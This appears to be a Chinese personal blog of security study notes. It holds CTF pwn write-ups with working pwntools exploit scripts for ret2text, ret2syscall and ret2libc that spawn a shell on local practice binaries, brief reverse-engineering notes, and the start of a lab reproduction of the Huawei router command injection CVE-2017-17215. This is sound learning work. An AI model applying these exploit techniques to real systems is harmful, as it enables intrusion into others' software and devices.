+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">             +-----------------+</span><br><span class="line">             |     retaddr     |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |     saved ebp   |</span><br><span class="line">      ebp---&gt;+-----------------+</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">s,ebp-0x14--&gt;+-----------------+</span><br></pre></td></tr></table></figure>
+<p>并且，我们可以通过 IDA 获得 success 的地址，其地址为 0x0804843B。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.text:0804843B success         proc near</span><br><span class="line">.text:0804843B                 push    ebp</span><br><span class="line">.text:0804843C                 mov     ebp, esp</span><br><span class="line">.text:0804843E                 sub     esp, 8</span><br><span class="line">.text:08048441                 sub     esp, 0Ch</span><br><span class="line">.text:08048444                 push    offset s        ; &quot;You Hava already controlled it.&quot;</span><br><span class="line">.text:08048449                 call    _puts</span><br><span class="line">.text:0804844E                 add     esp, 10h</span><br><span class="line">.text:08048451                 nop</span><br><span class="line">.text:08048452                 leave</span><br><span class="line">.text:08048453                 retn</span><br><span class="line">.text:08048453 success         endp</span><br></pre></td></tr></table></figure>
+<p>那么如果我们读取的字符串为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x14*&apos;a&apos;+&apos;bbbb&apos;+success_addr</span><br></pre></td></tr></table></figure>
+<p>那么，由于 gets 会读到回车才算结束，所以我们可以直接读取所有的字符串，并且将 saved ebp 覆盖为 bbbb，将 retaddr 覆盖为 success_addr，即，此时的栈结构为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">             +-----------------+</span><br><span class="line">             |    0x0804843B   |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |       bbbb      |</span><br><span class="line">      ebp---&gt;+-----------------+</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">s,ebp-0x14--&gt;+-----------------+</span><br></pre></td></tr></table></figure>
+<p>因为NX是开着的，所以，不能让IP寄存器指向堆，栈</p>
+<ul>
+<li>NX保护：<br>你不能执行我就不执行，栈里面的内容只负责把程序执行流引入到一个需要的汇编代码的位置处，然后调用程序自己的一些代码来实现攻击。你可以调用含有call或者ret代码这样就能一直连接下去。这就是大佬说的ROP链。</li>
+<li>cannary：<br>函数在执行的时候把一个值放入到栈内的某个位置，我们想要溢出返回地址就要改变这个值，返回的时候系统检查canary值是否改变，如果改变就调用check_failed()函数，打印程序名然后退出。基于这个原理我们可以1、找到canary的值然后填进去。2、可以覆盖掉check_\failed()的调用地址换成system() </li>
+</ul>
+<h2 id="2-ret2shellcode"><a href="#2-ret2shellcode" class="headerlink" title="2.ret2shellcode"></a>2.ret2shellcode</h2><p>首先检测程序开启的保护</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  ret2shellcode checksec ret2shellcode</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
+<p><img src="http://ww1.sinaimg.cn/large/0063hjnqly1g87euwegj4j30io089js6.jpg" alt="5.jpg"></p>
+<p>这里之前一直不明白为啥之后还是要引向buf2_addr这个地址。后来想起来，先生成的shellcode强行产生了112位，去填充栈的内空间，然后再指向buf2_addr这个地址。</p>
+<p><img src="http://ww1.sinaimg.cn/large/0063hjnqly1g87f1gjc4jj308z055glu.jpg" alt="6.jpg"></p>
+<p>因为ida中直接看伪代码可知道，填充的112个字符串中，含有shellcode，并且会把这个112字符串赋值给buf2.跳转之后，会指向buf2中的数据，然后buf2数据是包含shellcode的，然后获得shell权限。</p>
+<p>当时没理解就是因为</p>
+<h3 id="3-ret2syscall-int-0x80-系统调用"><a href="#3-ret2syscall-int-0x80-系统调用" class="headerlink" title="3.ret2syscall(int 0x80 系统调用)"></a>3.ret2syscall(int 0x80 系统调用)</h3><p>首先检测程序开启的保护</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  ret2syscall checksec rop</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+<p> <a href="https://blog.51cto.com/11797152/2379740?source=dra" target="_blank" rel="noopener">https://blog.51cto.com/11797152/2379740?source=dra</a> </p>
+<p>讲得非常详细</p>
+<p>我们知道溢出偏移量了，现在我们想执行命令，例如execve(“/bin/sh”,null,null)。此时要设计到Linux在调用系统函数时的用法。</p>
+<p>系统函数调用的指令是int 0x80,这是固定指令，他有四个参数：</p>
+<ul>
+<li>系统调用号，即 eax 应该为 0xb</li>
+<li>第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</li>
+<li>第二个参数，即 ecx 应该为 0</li>
+<li>第三个参数，即 edx 应该为 0</li>
+</ul>
+<p>如果你学过任意一门编程语言，可以理解为int 0x80(eax,ebx,ecx,edx)。可能会有这样的疑问：为什么是eax,ebx,ecx,edx要设置为这些值，答案是系统在运行的时候就是固定的要读这四个寄存器，如果不这么写，就不会调用到execve函数。</p>
+<p>接下来我们就要一点点的去拼凑这些内容，我们没法直接在栈里写指令，只能够利用程序中自带的指令去拼凑。</p>
+<p>首先我们将eax设置为0xb，我们是没法直接往栈里写mov eax,0xb的，那么还有另一种方式是pop eax，但是要保证栈顶必须是0xb。</p>
+<p>然后设置ebx,ecx,edx，同样是这样的道理，所以我们可以想象栈中的数据是：</p>
+<p>pop eax；ret</p>
+<p>0xb</p>
+<p>pop ebx;pop ecx;pop edx;ret</p>
+<p>“/bin/sh”的地址</p>
+<p>0</p>
+<p>0</p>
+<p>int 0x80的地址</p>
+<p>这样我们就可以保值eax，ebx，ecx，edx的值了。</p>
+<h3 id="4-ret2libc1"><a href="#4-ret2libc1" class="headerlink" title="4.ret2libc1"></a>4.ret2libc1</h3><p>注重了解一下system传参</p>
+<p>主要就是理解函数的调用过程</p>
+<p>payload = ‘A’*112 + p32(system_addr) + ‘aaaa’ +p32(binsh_addr)</p>
+<p>先是覆盖，然后跳转到system函数的地址，然后跟着aaaa作为system的返回地址，再把/bin/sh的地址作为system的参数放入system</p>
+<p> <a href="https://www.cnblogs.com/pwn2web/p/10349971.html" target="_blank" rel="noopener">https://www.cnblogs.com/pwn2web/p/10349971.html</a> </p>
+<h3 id="5-ret2libc2"><a href="#5-ret2libc2" class="headerlink" title="5.ret2libc2"></a>5.ret2libc2</h3><p>有system函数</p>
+<p>但是没有/bin/sh去执行shell</p>
+<p>构造/bin/sh，</p>
+<ul>
+<li><p>总的思路</p>
+<p>1、用gets的地址覆盖函数返回地址</p>
+<p>2、构造gets的返回地址，（因为gets输入shellcode后，我们就要调用system函数来getshell，所以gets的返回地址是system函数的调用地址，即system_plt）</p>
+<p>3、构造gets需要的参数(就是存放输入字符串的地址，bss段0x804A080)</p>
+<p>4、构造system的参数(就是存放输入字符串的地址，bss段0x804A080)<img src="http://ww1.sinaimg.cn/large/0063hjnqly1g8fltypgtuj30dy0dygm9.jpg" alt="栈结构.jpg"></p>
+</li>
+</ul>
+<p>这种从第一个函数跳到第二函数，跳来跳去的方式就是rop，串起来的方式就是rop链</p>
+<p>由于系统调用原因，调用的时候：1.先是函数地址，2。函数的返回地址，3.函数的传入参数</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">bss_addr = <span class="number">0x0804A080</span></span><br><span class="line">gets_plt = <span class="number">0x08048460</span></span><br><span class="line">sys_plt  = <span class="number">0x08048490</span> </span><br><span class="line">io=process(<span class="string">'./ret2libc2'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'What do you think ?'</span>)</span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">112</span> + p32(gets_plt) + p32(sys_plt) + p32(bss_addr) + p32(bss_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="6-ret2libc3"><a href="#6-ret2libc3" class="headerlink" title="6.ret2libc3"></a>6.ret2libc3</h3><h5 id="0x01-这里就需要了解一下libc的作用"><a href="#0x01-这里就需要了解一下libc的作用" class="headerlink" title="0x01.这里就需要了解一下libc的作用"></a>0x01.这里就需要了解一下libc的作用</h5><ul>
+<li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li>
+<li>即使程序开启了ALSR，但是程序的低3位地址是不会变的，我们可以泄露出某个执行过的函数的低三位地址进而确定libc的版本</li>
+<li>泄露某个函数的地址我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。</li>
+</ul>
+<h5 id="0x02-获取一下libc的版本"><a href="#0x02-获取一下libc的版本" class="headerlink" title="0x02.获取一下libc的版本"></a>0x02.获取一下libc的版本</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">proc = &apos;./ret2libc3&apos;</span><br><span class="line">elf = ELF(proc)</span><br><span class="line">p = process(proc)</span><br><span class="line">if args.G:</span><br><span class="line">        gdb.attach(p) #运行的时候加上G，进入gdb调试</span><br><span class="line">p.sendlineafter(&apos;!?&apos;, &apos;a&apos; * 112 + p32(elf.plt[&apos;puts&apos;]) + &apos;aaaa&apos; + p32(elf.got[&apos;puts&apos;]))</span><br><span class="line">print &apos;puts_addr =:&apos; +hex(u32(p.recv(4)))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><img src="http://ww1.sinaimg.cn/large/0063hjnqly1g8uamvho6aj30k607q0ua.jpg" alt="1.jpg"></p>
+<p>通过puts函数打印一下puts函数在got表中的位置，这个位置也就是puts函数的地址。然后通过泄露的puts函数的地址的后三位(0xf7d9aca0)ca0来确定libc的版本。确定方法有很多可以用libcdatabase去查，或者是一个python的插件LibcSearcher去查询。</p>
+<p>然后通过puts的地址减去泄露的libc中的puts函数的偏移，去获得libc_base基地址。通过libc_base+libc中需要用到的函数或者字符串的偏移去算得个函数的具体地址。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">puts_addr = u32(p.recv(4))</span><br><span class="line">libc = LibcSearcher(&apos;puts&apos;,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(&apos;puts&apos;)</span><br><span class="line">system_addr = libc_base + libc.dump(&apos;system&apos;)</span><br><span class="line">binsh_addr = libc_base + libc.dump(&apos;str_bin_sh&apos;)</span><br><span class="line">#用的python插件或者libc中的偏移，github自行下载</span><br></pre></td></tr></table></figure>
+<p>然后就可以通过调用获得shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line"></span><br><span class="line">main_addr = 0x8048618</span><br><span class="line">proc = &apos;./ret2libc3&apos;</span><br><span class="line">elf = ELF(proc)</span><br><span class="line">#libc = ELF(&apos;libc.so&apos;)</span><br><span class="line">p = process(proc)</span><br><span class="line">if args.G:</span><br><span class="line">	gdb.attach(p)</span><br><span class="line">p.sendlineafter(&apos;!?&apos;, &apos;a&apos; * 112 + p32(elf.plt[&apos;puts&apos;]) + p32(main_addr) + p32(elf.got[&apos;puts&apos;]))</span><br><span class="line"></span><br><span class="line">puts_addr = u32(p.recv(4))</span><br><span class="line">#libc_base = puts_addr - libc.symbols[&apos;puts&apos;]</span><br><span class="line">#system_addr = libc_base + libc.symbols[&apos;system&apos;]</span><br><span class="line">#binsh_addr = libc_base + 0x15ba0b</span><br><span class="line">libc = LibcSearcher(&apos;puts&apos;,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(&apos;puts&apos;)</span><br><span class="line">system_addr = libc_base + libc.dump(&apos;system&apos;)</span><br><span class="line">binsh_addr = libc_base + libc.dump(&apos;str_bin_sh&apos;)</span><br><span class="line"></span><br><span class="line">p.sendline(&apos;a&apos; * 104 + p32(system_addr) + p32(main_addr) + p32(binsh_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>后来为啥从112的偏移变成了104的话，我还不太会，gdb不咋会用有点尴尬</p>
+<h3 id="2-hello"><a href="#2-hello" class="headerlink" title="2.hello"></a>2.hello</h3><p>大概就是占满内存，然后就阻塞了，跳转到指定的函数地址。</p>
+<p>text一般是有权限的。</p>
+<h2 id="Bugku"><a href="#Bugku" class="headerlink" title="Bugku"></a>Bugku</h2><h3 id="2-pwn2"><a href="#2-pwn2" class="headerlink" title="2.pwn2"></a>2.pwn2</h3><p>先覆盖，再执行</p>
+<h3 id="3-pwn4"><a href="#3-pwn4" class="headerlink" title="3.pwn4"></a>3.pwn4</h3><p>常见的除了‘/bin/sh’还有’$0’也可以是shell的地址</p>
+<h2 id="极客大挑战2019"><a href="#极客大挑战2019" class="headerlink" title="极客大挑战2019"></a>极客大挑战2019</h2><h3 id="1-pwn2"><a href="#1-pwn2" class="headerlink" title="1.pwn2"></a>1.pwn2</h3><p>直接正常操作</p>
+<p>覆盖地址，然后跳转到get shell函数</p>
+<h2 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h2><h3 id="1-static-x86"><a href="#1-static-x86" class="headerlink" title="1.static x86"></a>1.static x86</h3><p>ELF 64学习</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用原理</span><br></pre></td></tr></table></figure>
+<p>由于没有开NX，所以比较好被利用，有read函数，而且read函数的空间够大</p>
+<p>alsr开启的话，可以通过read，读到read段</p>
+<p>动态链接会有plt表，会有函数地址</p>
+<p>用cyclic 去填充，看到eip地址</p>
+<p>cyclic -l去算eip的返回地址</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://devil0x.github.io/2019/10/12/逆向学习/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="devil0x">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="devil0x菜鸟">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/10/12/逆向学习/" itemprop="url">逆向学习</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-12T22:25:12+08:00">
+                2019-10-12
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="逆向学习"><a href="#逆向学习" class="headerlink" title="逆向学习"></a>逆向学习</h1><p>刚写的文档忘记保存了，我丢typora。。。</p>
+<p>难受记得随手crtl s吧。</p>
+<h2 id="功放世界"><a href="#功放世界" class="headerlink" title="功放世界"></a>功放世界</h2><h3 id="1-re1"><a href="#1-re1" class="headerlink" title="1.re1"></a>1.re1</h3><p>普通直接看到字符串的题</p>
+<p>反编译的结果不是一定正确的，IDA采用递归下降法进行反编译，它的优点在于很少会在反编译时把数据当作代码来处理，不过这次IDA很明显把flag当成代码，进行了反编译，因此在string界面无法找到flag</p>
+<p>解决方法是在IDA打开文件时选择binary file,在此模式下IDA不会进行反编译，此时再打开strings界面就可发现flag  </p>
+<h3 id="2-game"><a href="#2-game" class="headerlink" title="2.game"></a>2.game</h3><p>一个字符串游戏</p>
+<p>直接查看打印flag的函数</p>
+<p><img src="http://ww1.sinaimg.cn/large/0063hjnqly1g7vtptv0nmj30gk07s0tn.jpg" alt="Snipaste_2019-10-12_22-38-15.jpg"></p>
+<p>我觉得自己的c语言学的太菜了。。。。。写个脚本即可得出结果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c = &apos;&apos; #空字符串</span><br></pre></td></tr></table></figure>
+<h3 id="3-Hello-CTF"><a href="#3-Hello-CTF" class="headerlink" title="3.Hello, CTF"></a>3.Hello, CTF</h3><p><img src="http://ww1.sinaimg.cn/large/0063hjnqly1g7vwze4vhej30j4054wf6.jpg" alt="Snipaste_2019-10-13_00-25-05.jpg"></p>
+<p>这个解析写的不错</p>
+<h3 id="4-open-source"><a href="#4-open-source" class="headerlink" title="4.open-source"></a>4.open-source</h3><p>注意看每句话定义的含义，以及flag产生函数所调用的变量有哪几个.</p>
+<p><img src="http://ww1.sinaimg.cn/large/0063hjnqly1g7wktkle8vj30he07sjsa.jpg" alt="Snipaste_2019-10-13_10-56-19.jpg"></p>
+<h3 id="5-simple-unpack"><a href="#5-simple-unpack" class="headerlink" title="5.simple-unpack"></a>5.simple-unpack</h3>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://devil0x.github.io/2019/06/20/路由器·漏洞挖掘/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="devil0x">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="devil0x菜鸟">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/06/20/路由器·漏洞挖掘/" itemprop="url">360 iot 路由器漏洞挖掘</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-20T03:26:52+08:00">
+                2019-06-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="1-复现CVE-2017-17215学习路由器漏洞分析"><a href="#1-复现CVE-2017-17215学习路由器漏洞分析" class="headerlink" title="1.复现CVE-2017-17215学习路由器漏洞分析"></a>1.复现CVE-2017-17215学习路由器漏洞分析</h2><p>然后再复现CVE-2018-17068、CVE-2018-5767、CVE-2016-5367</p>
+<p>华为已经发了漏洞公告，固件已经升级到HG532eV100R001C02B017_upgrade_main.bin。从论坛里找到了带漏洞版本件，HG532eV100R001C02B015_upgrade_main.bin。</p>
+<p>附上下载链接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ia601506.us.archive.org/22/items/RouterHG532e/router%20HG532e.rar</span><br></pre></td></tr></table></figure>
+<h2 id="2-先补一下这个漏洞的详情"><a href="#2-先补一下这个漏洞的详情" class="headerlink" title="2.先补一下这个漏洞的详情"></a>2.先补一下这个漏洞的详情</h2><p><strong>零日（CVE-2017-17215）</strong></p>
+<p>华为家庭网关采用通用即插即用（UPnP）协议。通过TR-064技术报告标准，该协议广泛用于嵌入式设备中，无缝连接并简化家庭和企业环境中网络的实施。</p>
+<p>TR-064专为本地网络配置而设计。例如，它允许工程师从内部网络中实现基本设备配置，固件升级等。</p>
+<p>但在这种情况下，华为设备中的TR-064实现通过端口37215（UPnP）暴露给WAN。</p>
+<p>从查看设备的UPnP描述，可以看出它支持名为<code>DeviceUpgrade</code>的服务类型。据推测，该服务通过向“/ ctrlt / DeviceUpgrade_1”（称为controlURL）发送请求来执行固件升级操作，并使用名为“NewStatusURL”和“NewDownloadURL”的两个元素执行。</p>
+<p>该漏洞允许远程管理员通过在NewStatusURL和NewDownloadURL中注入shell元字符“$（）”来执行任意命令，如下所示。</p>
+<p>Upnp：</p>
+<h3 id="1-分析环境是ubuntu-16-04"><a href="#1-分析环境是ubuntu-16-04" class="headerlink" title="1.分析环境是ubuntu 16.04."></a>1.分析环境是ubuntu 16.04.</h3><p>先用binwalk 解压一下：</p>
+<h3 id="2-配置复现环境"><a href="#2-配置复现环境" class="headerlink" title="2. 配置复现环境"></a>2. 配置复现环境</h3><p>安装 qemu：实现mips处理器构架模拟环境。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install qemu </span><br><span class="line"></span><br><span class="line">sudo apt-get install qemu-user-static</span><br><span class="line"></span><br><span class="line">sudo apt-get install qemu-system</span><br></pre></td></tr></table></figure>
+<p>安装网络配置工具：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install bridge-utils uml-utilities</span><br></pre></td></tr></table></figure>
+<p>安装网络配置工具：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install bridge-utils uml-utilities</span><br></pre></td></tr></table></figure>
+<p>修改 ubuntu主机网络配置，将ubuntu主机系统中的网络接口配置文件 nano /etc/network/interfaces 修改为如下内容：</p>
+<p><a href="https://image.3001.net/images/20180111/15156587081163.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180111/15156587081163.png!small" alt="通过CVE-2017-17215学习路由器漏洞分析"></a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># ubuntu 16.04的系统用ens33代替eth0</span><br><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line"> </span><br><span class="line">auto eth0</span><br><span class="line">iface eth0 inet manual</span><br><span class="line">up ifconfig eth0 0.0.0.0 up</span><br><span class="line"> </span><br><span class="line">auto br0</span><br><span class="line">iface br0 inet dhcp</span><br><span class="line">bridge_ports eth0</span><br><span class="line">bridge_maxwait 0</span><br></pre></td></tr></table></figure>
+<p>创建QEMU的网络接口启动脚本（nano /etc/qemu-ifup）并保存为如下内容：</p>
+<p>如果之前就已经有内容的话，直接在基础添加即可</p>
+<p><a href="https://image.3001.net/images/20180111/1515658972939.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180111/1515658972939.png!small" alt="通过CVE-2017-17215学习路由器漏洞分析"></a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">echo &quot;Executing /etc/qemu-ifup&quot;</span><br><span class="line">echo &quot;Bringing $1 for bridged mode...&quot;</span><br><span class="line">sudo /sbin/ifconfig $1 0.0.0.0 promisc up</span><br><span class="line">echo &quot;Adding $1 to br0...&quot;</span><br><span class="line">sudo /sbin/brctl addif br0 $1</span><br><span class="line">sleep 3</span><br></pre></td></tr></table></figure>
+<p>赋予文件/etc/qemu-ifup 可执行权限：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod a+x /etc/qemu-ifup</span><br></pre></td></tr></table></figure>
+<p>重启网络使所有的配置生效：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /etc/init.d/networking restart</span><br></pre></td></tr></table></figure>
+<p>关闭ens33，启动桥连网络br0</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo ifdown eth0</span><br><span class="line">sudo ifdown br0</span><br><span class="line">sudo ifup br0</span><br></pre></td></tr></table></figure>
+<h3 id="3-debian-org-gt-aurel32-qemu-mips-下载对应的debian-mips-qemu镜像"><a href="#3-debian-org-gt-aurel32-qemu-mips-下载对应的debian-mips-qemu镜像" class="headerlink" title="3.debian.org/&gt;~aurel32/qemu/mips/下载对应的debian mips qemu镜像"></a>3.debian.org/&gt;~aurel32/qemu/mips/下载对应的debian mips qemu镜像</h3><p>我下载的是debian_squeeze_mips_standard.qcow2和vmlinux-2.6.32-5-4kc-malta。</p>
+<p>从<a href="https://people.debian.org/" target="_blank" rel="noopener">https://people.debian.org/</a>~aurel32/qemu/mips/下载对应的debian mips qemu镜像</p>
+<p><a href="https://image.3001.net/images/20180111/15156592945471.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180111/15156592945471.png!small" alt="通过CVE-2017-17215学习路由器漏洞分析"></a></p>
+<p>然后启动镜像</p>
